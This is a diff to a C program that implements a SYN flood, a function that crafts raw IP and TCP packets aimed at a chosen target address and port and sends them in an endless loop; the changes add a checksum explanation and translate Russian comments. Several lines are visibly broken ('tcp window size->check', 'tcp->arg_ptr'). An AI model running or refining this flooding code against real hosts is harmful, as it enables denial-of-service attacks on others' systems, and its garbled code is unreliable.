@@ -10,6 +10,16 @@
 
 #define PACKET_LEN sizeof(struct iphdr) + sizeof(struct tcphdr)
 
+/*
+Imagine that you are sending a letter by mail. To make sure that no one spoils it along the way, you write in the corner:
+"There are exactly 1000 characters in this letter."
+
+If the postman delivers a letter and it contains 999 characters, it means that something is lost.
+In code:
+ip->check = 0;  // Reset to zero before calculating
+ip->check = csum((unsigned short*)ip, sizeof(struct iphdr)); // Counting the amount for the IP
+tcp->check = csum((unsigned short*)tcp, sizeof(struct tcphdr)); // And for the TCP
+*/
 // Define packet size as the sum of IP and TCP header sizes.   
 unsigned short csum(unsigned short *buf, int len) {
     unsigned long sum = 0;
@@ -53,7 +63,7 @@ void syn_flood(const char* target_ip, int target_port) {
     ip->addr = inet_addr(target_ip); // Target IP
     
     // Filling in the TCP header
-    tcp->source =htons(rand() %65535); // Random sender port
+    tcp->source =htons(rand() % 65535); // Random sender port
     tcp->dest =htons(target_port); // Target port
     tcp->seq = htonl(rand()); // Sequence number
     tcp->ack_seq = 0; // TCP confirmation
@@ -63,7 +73,7 @@ void syn_flood(const char* target_ip, int target_port) {
     tcp window size->check = 0; // Checksum (so far 0)
     tcp->arg_ptr = 0; // Urgency indicator
     
-    // Рассчет контрольных сумм
+    // Calculation of checksums
     struct sockaddr_in dest;
     dest.sin_family = AF_INET;
     dest.sin_port = tcp->dest;
@@ -72,7 +82,7 @@ void syn_flood(const char* target_ip, int target_port) {
     tcp->check = csum((unsigned short*)tcp, sizeof(struct tcphdr));
     ip->check = csum((unsigned short*)ip, sizeof(struct iphdr));
     
-    // Отправка пакетов
+    // Send packets
     while(1) {
         if(sendto(s, packet, PACKET_LEN, 0, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
             perror("sendto");
